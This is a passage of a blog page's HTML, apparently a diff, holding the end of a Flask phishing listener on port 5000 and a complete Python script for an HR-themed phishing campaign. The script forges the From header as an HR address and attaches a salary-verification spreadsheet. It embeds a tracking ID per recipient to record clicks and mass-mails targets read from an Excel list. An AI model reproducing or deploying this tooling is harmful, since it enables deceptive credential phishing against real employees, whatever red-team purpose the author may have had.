class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="built_in">print</span>(termcolor.colored(<span class="string">&#x27;Create table failed&#x27;</span>,<span class="string">&quot;yellow&quot;</span>))</span><br><span class="line">       </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    creat_db()</span><br><span class="line">    <span class="built_in">print</span>(termcolor.colored(<span class="string">&#x27;开始钓鱼，请等待鱼儿上钩....正在监听当前ip的5000端口&#x27;</span>,<span class="string">&quot;green&quot;</span>))</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-sendemail-randomid"><a href="#2-sendemail-randomid" class="headerlink" title="2.sendemail-randomid"></a>2.sendemail-randomid</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> openpyxl   <span class="comment">#导入openpyxl模</span></span><br><span class="line"><span class="comment">#参考https://blog.csdn.net/weixin_35540389/article/details/113714867</span></span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendmail</span>(<span class="params">mail_toperson,randomid</span>):</span></span><br><span class="line">    mail_host = <span class="string">&quot;********&quot;</span></span><br><span class="line">    mail_sender = <span class="string">&quot;hr@********&quot;</span></span><br><span class="line">    mail_license = <span class="string">&quot;********&quot;</span></span><br><span class="line">    mail_receivers = mail_toperson</span><br><span class="line">    mm = MIMEMultipart(<span class="string">&#x27;related&#x27;</span>)</span><br><span class="line">    subject_content = <span class="string">&quot;&quot;&quot;您的EHR信息需要更新&quot;&quot;&quot;</span></span><br><span class="line">    mm[<span class="string">&quot;From&quot;</span>] = <span class="string">&quot;hr@********&quot;</span><span class="comment">#邮件伪造，隐藏账号所属分支</span></span><br><span class="line">    mm[<span class="string">&quot;To&quot;</span>] = mail_toperson<span class="comment">#改成用户名</span></span><br><span class="line">    mm[<span class="string">&quot;Subject&quot;</span>] = Header(subject_content, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    randomid= randomid<span class="comment">#引入randomid概念，在邮件中插入randomid，用于查询邮件发送状态对应的人员是否点击</span></span><br><span class="line">    body_content = <span class="string">&quot;&quot;&quot;放入邮件的html********&quot;&quot;&quot;</span>%(randomid)</span><br><span class="line">    message_text = MIMEText(body_content,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    mm.attach(message_text)</span><br><span class="line">    filename = <span class="string">&quot;薪资情况核实.xlsx&quot;</span></span><br><span class="line">    att1 = MIMEText(<span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>).read(), <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    att1[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">    <span class="comment"># 这里的filename可以任意写，写什么名字，邮件中显示什么名字</span></span><br><span class="line">    att1.add_header(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">&#x27;attachment&#x27;</span>, filename=filename)</span><br><span class="line">    <span class="comment"># att1[&quot;Content-Disposition&quot;] = &#x27;attachment; filename=%s&#x27;%(filename)#无法中文</span></span><br><span class="line">    mm.attach(att1)<span class="comment">#增加附件内容</span></span><br><span class="line"></span><br><span class="line">    stp = smtplib.SMTP_SSL(host=mail_host)<span class="comment">#改为ssl</span></span><br><span class="line">    stp.connect(mail_host, <span class="number">465</span>)</span><br><span class="line">    stp.set_debuglevel(<span class="number">1</span>)</span><br><span class="line">    stp.login(mail_sender, mail_license)</span><br><span class="line">    stp.sendmail(mail_sender, mail_receivers, mm.as_string())</span><br><span class="line">    <span class="built_in">print</span>(mail_toperson+<span class="string">&quot;\t邮件发送成功,randomid:&quot;</span>+randomid)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;sendmail.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(mail_toperson+<span class="string">&quot;\t邮件发送成功,randomid:&quot;</span>+randomid+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    stp.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    wb = openpyxl.reader.excel.load_workbook(filename=<span class="string">r&#x27;*****.xlsx&#x27;</span>)  <span class="comment"># 打开excel文件</span></span><br><span class="line">    sheetnames = wb.get_sheet_names()</span><br><span class="line">    ws = wb.get_sheet_by_name(sheetnames[<span class="number">0</span>])</span><br><span class="line">    data_dic = &#123;&#125;</span><br><span class="line">    <span class="comment"># for rx in range(1, 3):#修改条数用于测试邮件</span></span><br><span class="line">    <span class="keyword">for</span> rx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ws.max_row + <span class="number">1</span>):  <span class="comment">#</span></span><br><span class="line">        temp_list = []</span><br><span class="line">        pid = rx</span><br><span class="line">        w1 = ws.cell(row=rx, column=<span class="number">1</span>).value</span><br><span class="line">        w2 = ws.cell(row=rx, column=<span class="number">2</span>).value</span><br><span class="line">        w3 = ws.cell(row=rx, column=<span class="number">3</span>).value</span><br><span class="line">        w4 = ws.cell(row=rx, column=<span class="number">4</span>).value</span><br><span class="line">        temp_list = [w1, w2, w3, w4]</span><br><span class="line">        mail_toperson = <span class="built_in">str</span>(temp_list[<span class="number">2</span>])</span><br><span class="line">        randomid = <span class="built_in">str</span>(temp_list[<span class="number">3</span>])</span><br><span class="line">        <span class="built_in">print</span>(mail_toperson + <span class="string">&#x27;\t&#x27;</span> + randomid)</span><br><span class="line">        <span class="comment">#sendmail(mail_toperson, randomid)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sendmail(mail_toperson,randomid)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/04/13/%E8%A7%A3%E5%86%B3mac%E5%90%AF%E5%8A%A8tomcat%E4%B8%8D%E6%98%BE%E7%A4%BA%E6%97%A5%E5%BF%97/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          解决mac启动tomcat不显示日志
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/04/07/Ginblog/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Gin blog mvc</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2024 z0edff0x3d
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
